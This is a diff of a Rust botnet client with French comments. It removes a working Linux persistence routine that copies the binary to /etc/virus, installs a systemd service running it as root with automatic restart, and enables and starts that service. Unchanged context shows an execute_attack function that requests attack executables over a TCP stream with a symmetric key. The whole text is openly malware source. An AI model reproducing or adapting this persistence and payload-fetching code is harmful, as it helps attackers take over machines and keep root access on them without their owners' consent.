@@ -333,15 +333,10 @@ fn execute_attack(
     stream: &TcpStream,
 ) ->  io::Result<String> {
     
-    let executable_dir: &str;
+    let executable_dir = "./actions";
     let executable_path: PathBuf;
 
-    if cfg!(client_os = "windows"){
-        executable_dir = "./actions";
-    }else{
-        executable_dir = "/etc/actions";
-    }
-     
+    
     check_and_request_executable(attack_name, executable_dir, symetric_key, iv, stream)?;
 
     if cfg!(client_os = "windows"){
@@ -377,132 +372,10 @@ fn execute_attack(
     
 }
 
-fn persistence() {
-
-    // récupère le user pwd
-    let output = Command::new("pwd")
-        .output()
-        .expect("Erreur lors de la récupération du nom d'utilisateur");
-
-    println!("{:?}", output);
-
-    let pwd = String::from_utf8_lossy(&output.stdout).trim().to_string();
-    let path = format!("{}/PA-BOTNET-CLIENT", pwd);
-
-
-    // Copie un fichier dans le répertoire de démarrage
-    let output = Command::new("cp")
-        .arg(path)
-        .arg("/etc/")
-        .output()
-        .expect("Erreur lors de la copie du fichier");
-
-    println!("Fichier copié: {:?}", output);
-
-
-    let output = Command::new("mv")
-        .arg("/etc/PA-BOTNET-CLIENT")
-        .arg("/etc/virus")
-        .output()   
-        .expect("Erreur lors de la copie du fichier");
-
-
-    // Contenu du fichier de service
-    let service_content = r#"[Unit]
-    Description=Virus Service in Rust
-    After=network.target
-
-    [Service]
-    ExecStart=/etc/virus
-    Restart=always
-    User=root
-    Group=nogroup
-    Environment=RUST_LOG=info
-
-    [Install]
-    WantedBy=multi-user.target
-    "#;
-
-    // Écrire le fichier de service
-    let service_path = "/etc/systemd/system/virus.service";
-    let mut file = match fs::File::create(service_path) {
-        Ok(file) => file,
-        Err(e) => {
-            eprintln!("Erreur lors de la création du fichier: {}", e);
-            return;
-        },
-    };
-
-    if let Err(e) = file.write_all(service_content.as_bytes()) {
-        eprintln!("Erreur lors de l'écriture dans le fichier: {}", e);
-        return;
-    }
-
-    // Recharger systemd pour prendre en compte le nouveau service
-    let output = Command::new("systemctl")
-        .arg("daemon-reload")
-        .output()
-        .expect("Erreur lors du rechargement de systemd");
-    
-    if !output.status.success() {
-        eprintln!("Erreur lors du rechargement de systemd: {}", String::from_utf8_lossy(&output.stderr));
-        return;
-    }
-
-    // Activer le service pour qu'il démarre au démarrage
-    let output = Command::new("systemctl")
-        .arg("enable")
-        .arg("virus")
-        .output()
-        .expect("Erreur lors de l'activation du service");
-
-    if !output.status.success() {
-        eprintln!("Erreur lors de l'activation du service: {}", String::from_utf8_lossy(&output.stderr));
-        return;
-    }
-
-    // Démarrer le service immédiatement
-    let output = Command::new("systemctl")
-        .arg("start")
-        .arg("virus")
-        .output()
-        .expect("Erreur lors du démarrage du service");
-
-    if !output.status.success() {
-        eprintln!("Erreur lors du démarrage du service: {}", String::from_utf8_lossy(&output.stderr));
-        return;
-    }
-
-    println!("Service systemd créé et démarré avec succès !");
-
-    //kill le programme
-    std::process::exit(0);
-}
-
-fn check_service()-> bool{
-    let output = Command::new("systemctl")
-        .arg("status")
-        .arg("virus")
-        .output()
-        .expect("Erreur lors de la vérification du service");
-
-    if !output.status.success() {
-        false
-    }else{
-        true
-    }
-
-}
 
 fn create_action_dir(){
 
-    let path;
-
-    if cfg!(target_os = "windows") {
-        path = "./actions";
-    } else {
-        path = "/etc/actions/";
-    }
+    let path = "./actions";
 
     println!("[+] Création du dossier actions path: {}", path);
     match fs::create_dir(path){
@@ -518,15 +391,6 @@ fn create_action_dir(){
 
 fn main() -> io::Result<()> {
 
-    if cfg!(client_os = "linux"){
-        // Persistance
-        if check_service(){
-            println!("[+] Service systemd déjà créé et démarré");
-        }else{
-            println!("[+] Création du service systemd");
-            persistence();
-        }
-    }
 
     // Création du dossier actions
     create_action_dir();
